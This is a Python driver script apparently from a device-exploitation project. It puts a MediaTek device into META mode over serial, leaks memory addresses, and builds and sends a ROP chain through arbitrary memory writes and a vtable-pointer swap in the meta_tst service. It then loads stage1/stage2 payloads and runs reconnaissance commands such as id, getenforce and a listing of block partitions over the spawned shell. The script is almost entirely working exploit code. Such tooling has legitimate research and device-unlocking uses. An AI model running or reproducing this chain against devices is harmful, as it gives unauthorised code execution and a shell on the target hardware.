"""End-to-end driver: enter META (or attach to an existing META port), send the
ROP chain with the current bin/stage2.elf, save the payload output, then drive
diagnostic commands over the shell the payload tries to spawn.

All raw bytes go to files so console codepage never breaks the run:
    analysis/payload_out.bin   - everything received before the shell
    analysis/shell_out.txt     - command/response transcript
"""

import os
import sys
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
MODS = os.path.abspath(os.path.join(HERE, '..', 'saiyaku-athena', 'modules'))
sys.path.insert(0, MODS)
os.chdir(MODS)

import exploit  # noqa: E402
import leak  # noqa: E402
import meta  # noqa: E402
import profiles  # noqa: E402
import props  # noqa: E402
from device import Device, serial_ports  # noqa: E402
from logger import log  # noqa: E402

TIMEOUT = 1800
PAYLOAD_OUT = os.path.join(HERE, 'payload_out.bin')
SHELL_OUT = os.path.join(HERE, 'shell_out.txt')

COMMANDS = [
    'id',
    'cat /proc/self/status',
    'getenforce',
    'ls -l /dev/block/by-name/',
    'cat /proc/version',
    'getprop ro.build.version.name',
    'ls -l /data/local/tmp',
]


def _bail():
    print('TIMEOUT after {}s'.format(TIMEOUT), flush=True)
    os._exit(2)


def safe(data):
    return data.decode('latin-1').encode('ascii', 'backslashreplace').decode()


def wait_preloader(timeout=900):
    """Wait for a *new* port and try the METAMETA handshake on it."""
    log('Waiting for a preloader port... power-cycle the device now.')
    seen = set(serial_ports())
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        for port in sorted(serial_ports() - seen):
            dev = None
            try:
                dev = Device(port)
                dev.dev.timeout = 0.2
                deadline = time.monotonic() + 3
                c = b''
                while c != b'Y':
                    c = dev.read(1)
                    if not c and time.monotonic() > deadline:
                        raise RuntimeError('no READY')
                dev.drain()
                dev.write(b'METAMETA')
                log('METAMETA sent on {}'.format(port))
                return True
            except Exception as exc:
                log('handshake on {} failed: {}'.format(
                    port, str(exc).splitlines()[0]))
                if dev:
                    try:
                        dev.close()
                    except Exception:
                        pass
                seen.add(port)
        time.sleep(0.2)
    return False


def wait_meta(timeout=180):
    """Poll MTK ports until one answers the meta_tst alive frame."""
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        for port in sorted(serial_ports()):
            dev = None
            try:
                dev = Device(port)
                dev.dev.timeout = 0.5
                if meta.is_alive(dev):
                    log('meta_tst alive on {}'.format(port))
                    return dev
            except Exception:
                pass
            if dev is not None:
                try:
                    dev.close()
                except Exception:
                    pass
        time.sleep(0.5)
    raise RuntimeError('meta_tst did not answer')


def send_chain(dev):
    lk = leak.leak(dev)
    build = props.read(dev)
    log(props.get(build, 'ro.build.version.name') or 'unknown')
    prof = profiles.from_build_prop(build)

    libc = lk['libc']
    watcher = lk['main_sp'] + prof['watcher_off']
    table = lk['arg_start'] + 14
    base = lk['worker_sp'] + prof['pump_off'] + profiles.RX_OFF
    loader = open('../bin/stage1.bin', 'rb').read()
    pivot = lk['base'] + prof['rx_pivot'] | 1

    chain = exploit.stage_chain(prof, libc, 0x30000, 0x10000, 5, len(loader))
    writes = [(table, pivot)] + [
        (base + 4 * i, word) for i, word in enumerate(chain)
    ]
    triplets = [exploit.write4(watcher, addr, value) for addr, value in writes]
    swap = meta.vptr_write(watcher, table)

    for tr in triplets:
        for frame in tr:
            dev.write(frame)
            time.sleep(0.03)
        dev.drain()
    dev.write(swap[0])
    time.sleep(0.05)
    dev.write(swap[1])
    time.sleep(0.05)
    dev.drain()
    dev.write(swap[2])

    time.sleep(0.5)
    dev.write(loader)
    data = open('../bin/stage2.elf', 'rb').read()
    log('sent stage1/stage2 ({} bytes)'.format(len(data)))
    time.sleep(0.6)
    for i in range(0, len(data), 1024):
        dev.write(data[i:i + 1024])
        time.sleep(0.03)


def drain(dev, seconds):
    end = time.monotonic() + seconds
    out = bytearray()
    while time.monotonic() < end:
        chunk = dev.read(4096)
        if chunk:
            out.extend(chunk)
            end = time.monotonic() + 0.5
    return bytes(out)


def sh_cmd(dev, cmd, timeout=20):
    dev.dev.timeout = 0.3
    dev.write(cmd.encode() + b'\n')
    dev.write(b'echo __DONE__\n')
    out = bytearray()
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        chunk = dev.read(4096)
        if chunk:
            out.extend(chunk)
            if b'__DONE__' in out:
                break
        else:
            time.sleep(0.05)
    return bytes(out).replace(b'echo __DONE__\r\n', b'').replace(b'__DONE__', b'')


def main():
    threading.Timer(TIMEOUT, _bail).start()
    log('=== saiyaku payload run ===')

    port = None
    for arg in sys.argv[1:]:
        if arg.startswith('COM'):
            port = arg
    if port:
        log('attaching to existing META port {}'.format(port))
        dev = Device(port)
    else:
        if not wait_preloader():
            log('no preloader port, giving up')
            return
        log('waiting for meta_tst')
        dev = wait_meta()

    log('meta_tst port = {}'.format(dev.port))
    try:
        send_chain(dev)
    except Exception as exc:
        print('CHAIN ERROR: {}'.format(exc), flush=True)
        try:
            dev.close()
        except Exception:
            pass
        return

    with open(PAYLOAD_OUT, 'wb') as fout:
        fout.write(b'')
    raw = drain(dev, 6)
    with open(PAYLOAD_OUT, 'wb') as fout:
        fout.write(raw)
    print('--- payload output ({}) ---'.format(len(raw)), flush=True)
    print(safe(raw), flush=True)

    lines = []
    for cmd in COMMANDS:
        res = sh_cmd(dev, cmd)
        lines.append('$ ' + cmd + '\n' + safe(res) + '\n')
        print('$ ' + cmd, flush=True)
        print(safe(res), flush=True)
    with open(SHELL_OUT, 'w', encoding='utf-8') as fout:
        fout.write('\n'.join(lines))

    try:
        dev.close()
    except Exception:
        pass
    log('DONE')


if __name__ == '__main__':
    main()
